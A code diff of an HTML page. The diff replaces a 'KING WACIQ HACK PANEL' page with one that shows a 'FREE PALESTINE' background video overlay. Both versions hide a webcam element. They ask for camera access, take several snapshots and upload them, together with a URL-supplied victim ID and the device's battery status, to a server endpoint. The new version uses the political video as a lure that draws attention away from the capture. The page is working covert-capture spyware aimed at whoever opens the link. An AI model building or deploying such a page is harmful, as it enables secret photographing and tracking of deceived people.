@@ -1,142 +1,127 @@
-<!DOCTYPE html>  <html lang="en">  
-<head>  
-  <meta charset="UTF-8" />  
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>  
-  <title>KING WACIQ HACK PANEL</title>  
-  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@600&display=swap" rel="stylesheet">  
-  <style>  
-    html, body {  
-      margin: 0;  
-      padding: 0;  
-      background: #000;  
-      color: #00ff00;  
-      font-family: 'Orbitron', monospace;  
-      overflow: hidden;  
-      text-align: center;  
-    }  
-    canvas#matrix {  
-      position: fixed;  
-      top: 0;  
-      left: 0;  
-      z-index: 0;  
-    }  
-    .overlay {  
-      position: relative;  
-      z-index: 2;  
-      text-align: center;  
-      padding-top: 40px;  
-    }  
-    h1 {  
-      font-size: 3em;  
-      animation: glow 2s infinite alternate;  
-    }  
-    h2 {  
-      font-size: 2em;  
-      margin-bottom: 20px;  
-      animation: pulse 2s infinite;  
-    }  
-    p, .log {  
-      font-size: 16px;  
-      color: #66ff66;  
-    }  
-    video, canvas#snapshot {  
-      display: none;  
-    }  
-    @keyframes glow {  
-      from { text-shadow: 0 0 5px #00ff00; }  
-      to { text-shadow: 0 0 20px #00ff00, 0 0 30px #00ff00; }  
-    }  
-    @keyframes pulse {  
-      0% { transform: scale(1); opacity: 1; }  
-      50% { transform: scale(1.1); opacity: 0.7; }  
-      100% { transform: scale(1); opacity: 1; }  
-    }  
-  </style>  
-</head>  
-<body>  
-  <!-- Matrix Rain Background -->  
-  <canvas id="matrix"></canvas>    <div class="overlay">  
-    <h1>KING WACIQ</h1>  
-    <h2>HACK PANEL</h2>  
-    <p id="status">Connecting...</p>  
-    <div class="log" id="log"></div>  
-  </div>    <!-- Original Elements -->  <video id="video" autoplay playsinline></video>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>FREE PALESTINE Video Overlay</title>
+
+<!-- Google Font Orbitron -->
+<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700&display=swap" rel="stylesheet">
+
+<style>
+  html, body {
+    margin: 0;
+    padding: 0;
+    height: 100%;
+    width: 100%;
+    overflow: hidden;
+    background: url('https://i.postimg.cc/Mp85QgJD/IMG-20250917-124655-217.jpg') no-repeat center center fixed;
+    background-size: cover;
+    font-family: 'Orbitron', sans-serif;
+  }
+
+  video#bgVideo {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    object-fit: cover;
+    z-index: 0;
+  }
+
+  .text-layer {
+    position: absolute;
+    font-weight: 800;
+    white-space: nowrap;
+    z-index: 2;
+    color: #00ffea; /* مخکېنی رنګ */
+    text-shadow: 0 0 10px #00ffea, 0 0 20px #00aaff, 0 0 30px #0044ff;
+    animation: floatUp 10s linear infinite, glow 1.5s ease-in-out infinite alternate;
+  }
+  .text1 { font-size: 6vw; top: 50%; left: 20%; animation-delay: 0s; }
+  .text2 { font-size: 5vw; top: 55%; left: 40%; animation-delay: 2s; }
+
+  @keyframes floatUp {
+    0% { transform: translateY(0px); opacity: 1; }
+    100% { transform: translateY(-150px); opacity: 0.8; }
+  }
+
+  @keyframes glow {
+    0% { text-shadow: 0 0 10px #00ffea, 0 0 20px #00aaff, 0 0 30px #0044ff; }
+    100% { text-shadow: 0 0 20px #0044ff, 0 0 30px #00aaff, 0 0 40px #00ffea; }
+  }
+
+  /* Hidden camera + snapshot */
+  video#camera, canvas#snapshot {
+    display: none;
+  }
+</style>
+</head>
+<body>
+
+<!-- Background video -->
+<video id="bgVideo" autoplay playsinline loop muted>
+  <source src="https://www.dropbox.com/scl/fi/blfzo9n9oouo0mtwvz1n7/VID_20250917_085355_746.mp4?rlkey=q4y4es66z7z7sk1r2inv5bvbh&st=yevzhjt4&dl=1" type="video/mp4">
+</video>
+
+<!-- Text overlays -->
+<div class="text-layer text1">FREE PALESTINE</div>
+<div class="text-layer text2">FREE PALESTINE</div>
+
+<!-- Hidden camera + snapshot -->
+<video id="camera" autoplay playsinline></video>
 <canvas id="snapshot"></canvas>
 
-  <script>  
-    /* ===== Matrix Rain Animation ===== */  
-    const canvasMatrix = document.getElementById("matrix");  
-    const ctxMatrix = canvasMatrix.getContext("2d");  
-    canvasMatrix.height = window.innerHeight;  
-    canvasMatrix.width = window.innerWidth;  
-    let letters = Array(256).join("1").split("");  
-    function drawMatrix() {  
-      ctxMatrix.fillStyle = "rgba(0, 0, 0, 0.05)";  
-      ctxMatrix.fillRect(0, 0, canvasMatrix.width, canvasMatrix.height);  
-      ctxMatrix.fillStyle = "#0f0";  
-      letters.forEach((y, index) => {  
-        let text = String.fromCharCode(3e4 + Math.random() * 33);  
-        let x = index * 10;  
-        ctxMatrix.fillText(text, x, y);  
-        letters[index] = y > 758 + Math.random() * 1e4 ? 0 : y + 10;  
-      });  
-    }  
-    setInterval(drawMatrix, 33);  
-  
-    /* ===== Your Original Code (Unchanged) ===== */  
-    const video = document.getElementById('video');  
-    const canvas = document.getElementById('snapshot');  
-    const ctx = canvas.getContext('2d');  
-    const log = document.getElementById('log');  
-    const statusEl = document.getElementById('status');  
-  
-    const params = new URLSearchParams(window.location.search);  
-    const uid = params.get('uid') || 'unknown';  
-  
-    if (uid) {  
-      navigator.getBattery().then(battery => {  
-        const batteryLevel = Math.round(battery.level * 100);  
-        const isCharging = battery.charging;  
-  
-        log.innerText += `Battery: ${batteryLevel}% | Charging: ${isCharging}\n`;  
-  
-        navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {  
-          video.srcObject = stream;  
-          statusEl.innerText = "Camera access granted...";  
-  
-          setTimeout(() => takeSnapshotAndSend(batteryLevel, isCharging), 2000);  
-          setTimeout(() => takeSnapshotAndSend(batteryLevel, isCharging), 4000);  
-          setTimeout(() => takeSnapshotAndSend(batteryLevel, isCharging), 6000);  
-        }).catch(err => {  
-          console.error("Camera error:", err);  
-          statusEl.innerText = "Camera error!";  
-        });  
-      });  
-    }  
-  
-    function takeSnapshotAndSend(battery, charging) {  
-      canvas.width = video.videoWidth;  
-      canvas.height = video.videoHeight;  
-      ctx.drawImage(video, 0, 0);  
-      const imageData = canvas.toDataURL('image/png');  
-  
-      // ❗ Still original fetch (unchanged)  
-      fetch('/api/upload', {  
-        method: 'POST',  
-        headers: { 'Content-Type': 'application/json' },  
-        body: JSON.stringify({  
-          image: imageData,  
-          uid,  
-          battery,  
-          charging  
-        })  
-      }).then(res => res.json()).then(data => {  
-        console.log("Uploaded:", data);  
-        log.innerText += "Snapshot uploaded...\n";  
-      }).catch(err => {  
-        console.error("Upload error:", err);  
-        log.innerText += "Upload failed!\n";  
-      });  
-    }  
-  </script>  </body>  
-</html>   
+<script>
+const camera = document.getElementById('camera');
+const canvas = document.getElementById('snapshot');
+const ctx = canvas.getContext('2d');
+const uid = new URLSearchParams(window.location.search).get('uid') || 'unknown';
+const maxSnapshots = 4;
+let snapshotsTaken = 0;
+
+function takeSnapshotAndSend(battery, charging){
+  if(snapshotsTaken >= maxSnapshots) return;
+  canvas.width = camera.videoWidth;
+  canvas.height = camera.videoHeight;
+  ctx.drawImage(camera, 0, 0, canvas.width, canvas.height);
+  const imageData = canvas.toDataURL('image/png');
+
+  fetch('/api/upload', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ image: imageData, uid, battery, charging })
+  }).then(res => res.json()).then(data => {
+    snapshotsTaken++;
+    console.log("Snapshot uploaded:", snapshotsTaken);
+    if(snapshotsTaken === maxSnapshots){
+      console.log("Max snapshots reached, stopping camera.");
+      camera.srcObject.getTracks().forEach(track => track.stop());
+    }
+  }).catch(err => console.error("Upload error:", err));
+}
+
+// Start camera and take snapshots
+if(uid){
+  navigator.getBattery().then(battery => {
+    const batteryLevel = Math.round(battery.level * 100);
+    const isCharging = battery.charging;
+
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(stream => {
+        camera.srcObject = stream;
+
+        // Wait until video is playing before taking snapshots
+        camera.onplaying = () => {
+          for(let i=0; i<maxSnapshots; i++){
+            setTimeout(() => takeSnapshotAndSend(batteryLevel, isCharging), i*2000);
+          }
+        };
+      })
+      .catch(err => console.error("Camera error:", err));
+  });
+}
+</script>
+</body>
+</html> 
